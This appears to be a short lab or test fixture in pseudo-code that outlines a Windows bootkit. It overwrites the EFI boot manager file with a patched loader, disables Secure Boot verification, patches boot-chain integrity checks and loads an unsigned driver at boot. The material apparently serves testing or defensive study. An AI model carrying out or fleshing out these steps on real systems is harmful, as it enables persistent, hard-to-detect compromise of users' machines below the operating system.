; lab bootkit fixture
target = EFI\Microsoft\Boot\bootmgfw.efi
write(target, patched_loader)
disable SecureBoot verification
patch AME / integrity checks in boot chain
load unsigned driver at boot
